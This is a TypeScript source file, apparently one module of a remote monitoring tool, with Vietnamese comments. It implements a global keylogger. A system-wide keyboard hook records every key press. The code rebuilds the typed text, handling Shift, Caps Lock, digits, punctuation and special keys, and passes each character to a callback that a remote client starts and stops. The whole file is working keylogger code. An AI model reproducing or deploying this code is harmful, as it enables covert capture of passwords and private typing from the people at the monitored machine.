// file: src/services/keylogService.ts
import { GlobalKeyboardListener, IGlobalKeyEvent } from 'node-global-key-listener';

let listener: GlobalKeyboardListener | null = null;

/**
 * Hàm này được gọi khi Client bấm "Start Logging"
 */
export async function startKeylogHook(emitKeyCallback: (key: string) => void) {
    if (listener) {
        return { status: "warn", message: "Keylogger đã chạy rồi." };
    }

    listener = new GlobalKeyboardListener();

    // 1. Thay đổi 'any' thành 'Record<string, boolean>' để có gợi ý code
    listener.addListener((e: IGlobalKeyEvent, down: Record<string, boolean>) => {

        // Chỉ bắt sự kiện khi phím được NHẤN XUỐNG
        if (e.state === "DOWN") {
            // Ép kiểu (as string) để bỏ qua lỗi TS2367
            const keyName: string = (e.name as string) || 'UNKNOWN';
            console.log('Key:', e.name, 'Shift:', down['SHIFT'], 'Caps:', down['CAPS_LOCK']);
            // 2. Xử lý các phím điều khiển (control keys) trước
            if (keyName === 'SPACE') {
                emitKeyCallback(' ');
                return; // Kết thúc sớm
            }
            if (keyName === 'RETURN') {
                emitKeyCallback('[Enter]\n');
                return;
            }
            if (keyName === 'TAB') {
                emitKeyCallback('[Tab]');
                return;
            }
            if (keyName === 'BACKSPACE') {
                emitKeyCallback('[Backspace]');
                return;
            }

            // 3. Bỏ qua các phím bổ trợ (chúng ta chỉ dùng trạng thái của chúng)
            if (keyName.startsWith('SHIFT') || // Bắt cả SHIFT, LEFT SHIFT, RIGHT SHIFT
                keyName.startsWith('CONTROL') || // Bắt cả CONTROL, LEFT CONTROL...
                keyName.startsWith('ALT') || // Bắt cả ALT, LEFT ALT...
                keyName === 'COMMAND' || keyName === 'WINDOWS' ||
                keyName.startsWith('META') || // Bắt cả META, LEFT META...
                keyName === 'CAPS_LOCK') {
                return; // Không log phím bổ trợ, chỉ log kết quả
            }

            // 4. Lấy trạng thái của phím SHIFT và CAPS_LOCK
            const isShift: boolean = (down['LEFT SHIFT'] || down['RIGHT SHIFT']) || false;
            const isCaps: boolean = down['CAPS_LOCK'] || false; // 'true' nếu Caps Lock đang BẬT

            // 5. Xử lý các chữ cái (A-Z)
            // (e.name trả về chữ hoa: "A", "B", "C"...)
            if (keyName.length === 1 && keyName >= 'A' && keyName <= 'Z') {
                // Logic XOR:
                // - Shift + 'a' -> 'A' (isShift=true, isCaps=false => true)
                // - Caps + 'a' -> 'A' (isShift=false, isCaps=true => true)
                // - Shift + Caps + 'a' -> 'a' (isShift=true, isCaps=true => false)
                // - 'a' -> 'a' (isShift=false, isCaps=false => false)
                const isUppercase = isShift !== isCaps;
                const char = isUppercase ? keyName.toUpperCase() : keyName.toLowerCase();
                emitKeyCallback(char);
                return;
            }

            // 6. Xử lý các phím số (0-9) trên hàng phím chính
            // (e.name trả về "1", "2", "3"...)
            if (keyName.length === 1 && keyName >= '0' && keyName <= '9') {
                if (isShift) {
                    // Ánh xạ phím số sang ký tự đặc biệt (theo layout US)
                    const shiftMap: Record<string, string> = {
                        '1': '!', '2': '@', '3': '#', '4': '$', '5': '%',
                        '6': '^', '7': '&', '8': '*', '9': '(', '0': ')',
                    };
                    emitKeyCallback(shiftMap[keyName] || keyName);
                } else {
                    emitKeyCallback(keyName);
                }
                return;
            }

            // 7. Xử lý các phím dấu câu
            // (e.name trả về tên: "COMMA", "PERIOD"...)
            const punctuationMap: Record<string, [string, string]> = {
                // 'keyName': ['normal', 'shifted']
                'MINUS': ['-', '_'],
                'EQUALS': ['=', '+'],
                'OPEN_BRACKET': ['[', '{'],
                'CLOSE_BRACKET': [']', '}'],
                'BACK_SLASH': ['\\', '|'],
                'SEMICOLON': [';', ':'],
                'QUOTE': ["'", '"'],
                'COMMA': [',', '<'],
                'PERIOD': ['.', '>'],
                'SLASH': ['/', '?'],
                'BACK_QUOTE': ['`', '~'],
            };

            if (punctuationMap[keyName]) {
                const [normal, shifted] = punctuationMap[keyName];
                emitKeyCallback(isShift ? shifted : normal);
                return;
            }

            // 8. Fallback: Log các phím khác (F1, Home, End...)
            // Chỉ log nếu tên phím hợp lý (ngắn)
            if (keyName.length > 1 && keyName.length < 15) {
                emitKeyCallback(`[${keyName}]`);
            }
            // Bỏ qua các phím 'UNKNOWN' hoặc quá dài
        }
    });

    console.log("[Keylog Service] Đã HOOK");
    return { status: "ok", message: "Đã bắt đầu theo dõi phím bấm." };
}

/**
 * Hàm này được gọi khi Client bấm "Stop Logging"
 */
export async function stopKeylogHook() {
    if (listener) {
        listener.kill();
        listener = null;
        console.log("[Keylog Service] Đã UNHOOK");
        return { status: "ok", message: "Đã dừng theo dõi." };
    }
    return { status: "warn", message: "Keylogger chưa chạy." };
}